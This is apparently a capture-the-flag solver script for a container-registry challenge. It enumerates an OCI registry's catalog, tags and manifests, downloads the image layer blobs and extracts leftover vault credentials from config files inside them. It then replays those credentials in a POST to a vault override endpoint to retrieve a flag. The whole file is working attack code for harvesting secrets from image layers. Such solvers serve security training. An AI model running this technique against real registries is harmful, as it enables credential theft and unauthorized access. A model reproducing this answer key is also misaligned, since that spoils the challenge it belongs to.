#!/usr/bin/env python3
"""
Automated Participant-Side Solver for 27-private-container-registry
Queries the OCI Registry v2 API on port 8081, inspects layer blobs for latveria/orbital-sentinel:v1.0.0,
extracts purged vault credentials, and authenticates to the Orbital Vault service to retrieve the flag.
"""

import sys
import io
import re
import json
import tarfile
import argparse
import urllib.request
import urllib.error

def solve(base_url="http://127.0.0.1:8081"):
    base_url = base_url.rstrip("/")
    print("=" * 65)
    print(" [*] 27-private-container-registry Automated Solver")
    print(f" [*] Target URL: {base_url}")
    print("=" * 65)

    # Step 1: Query Registry Catalog
    print("\n[Step 1] Querying registry catalog...")
    catalog_url = f"{base_url}/v2/_catalog"
    req = urllib.request.Request(catalog_url)
    with urllib.request.urlopen(req, timeout=10) as resp:
        catalog = json.loads(resp.read().decode())
    print(f"[+] Discovered repositories: {catalog.get('repositories', [])}")

    repo = "latveria/orbital-sentinel"

    # Step 2: Enumerate Tags
    print(f"\n[Step 2] Enumerating tags for {repo}...")
    tags_url = f"{base_url}/v2/{repo}/tags/list"
    with urllib.request.urlopen(tags_url, timeout=10) as resp:
        tags_data = json.loads(resp.read().decode())
    tags = tags_data.get("tags", [])
    print(f"[+] Available tags: {tags}")

    # Step 3: Fetch Manifest for v1.0.0
    target_tag = "v1.0.0"
    print(f"\n[Step 3] Fetching manifest for {repo}:{target_tag}...")
    manifest_url = f"{base_url}/v2/{repo}/manifests/{target_tag}"
    with urllib.request.urlopen(manifest_url, timeout=10) as resp:
        manifest = json.loads(resp.read().decode())

    layers = manifest.get("layers", [])
    print(f"[+] Found {len(layers)} layer(s) in {target_tag}")

    # Step 4: Download and inspect layers for orbital_vault.conf
    print("\n[Step 4] Inspecting layer archives for purged configuration secrets...")
    token = None
    caller_id = "orbital_defense_service_master"
    gateway_action = "OVERRIDE_DEFENSE_GRID"

    for i, layer in enumerate(layers):
        digest = layer["digest"]
        blob_url = f"{base_url}/v2/{repo}/blobs/{digest}"
        print(f"    Fetching layer {i+1}: {digest[:20]}...")
        blob_data = urllib.request.urlopen(blob_url, timeout=15).read()

        try:
            with tarfile.open(fileobj=io.BytesIO(blob_data), mode="r:gz") as tar:
                for member in tar.getmembers():
                    if "orbital_vault.conf" in member.name or member.name.endswith(".conf"):
                        conf_bytes = tar.extractfile(member).read().decode()
                        print(f"[+] Found {member.name} in layer {i+1}!")
                        tok_match = re.search(r"LATVERIAN_INTERNAL_TOKEN\s*=\s*([a-zA-Z0-9_]+)", conf_bytes)
                        if tok_match:
                            token = tok_match.group(1)
                            print(f"[+] Extracted LATVERIAN_INTERNAL_TOKEN: {token}")
                        caller_match = re.search(r"LATVERIAN_CALLER_ID\s*=\s*([a-zA-Z0-9_]+)", conf_bytes)
                        if caller_match:
                            caller_id = caller_match.group(1)
                        action_match = re.search(r"LATVERIAN_GATEWAY_ACTION\s*=\s*([a-zA-Z0-9_]+)", conf_bytes)
                        if action_match:
                            gateway_action = action_match.group(1)
        except Exception:
            continue

    if not token:
        print("[-] Failed to find vault token in layer archives!")
        sys.exit(1)

    # Step 5: Authenticate to Vault Service on port 8081
    print(f"\n[Step 5] Sending authenticated override to {base_url}/api/v1/vault/override...")
    vault_url = f"{base_url}/api/v1/vault/override"
    headers = {
        "Content-Type": "application/json",
        "X-Latverian-Token": token,
        "X-Caller-ID": caller_id,
        "X-Gateway-Action": gateway_action
    }
    payload = json.dumps({
        "token": token,
        "caller": caller_id,
        "action": gateway_action
    }).encode()

    vault_req = urllib.request.Request(vault_url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(vault_req, timeout=10) as resp:
            resp_data = json.loads(resp.read().decode())
            print(f"[+] Vault Response ({resp.status}):\n{json.dumps(resp_data, indent=2)}")
            flag = resp_data.get("flag", "")
    except urllib.error.HTTPError as e:
        err_msg = e.read().decode()
        print(f"[-] Vault rejected request ({e.code}): {err_msg}")
        sys.exit(1)

    flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", flag)
    if not flag_match:
        print("[-] Flag not found in vault response!")
        sys.exit(1)

    extracted_flag = flag_match.group(1)
    print("\n" + "=" * 65)
    print(f"[SUCCESS] Flag Retrieved: {extracted_flag}")
    print("=" * 65 + "\n")
    return extracted_flag

def main():
    parser = argparse.ArgumentParser(description="27-private-container-registry Solver")
    parser.add_argument("--url", default="http://127.0.0.1:8081", help="Target URL (default: http://127.0.0.1:8081)")
    args = parser.parse_args()
    solve(args.url)

if __name__ == "__main__":
    main()
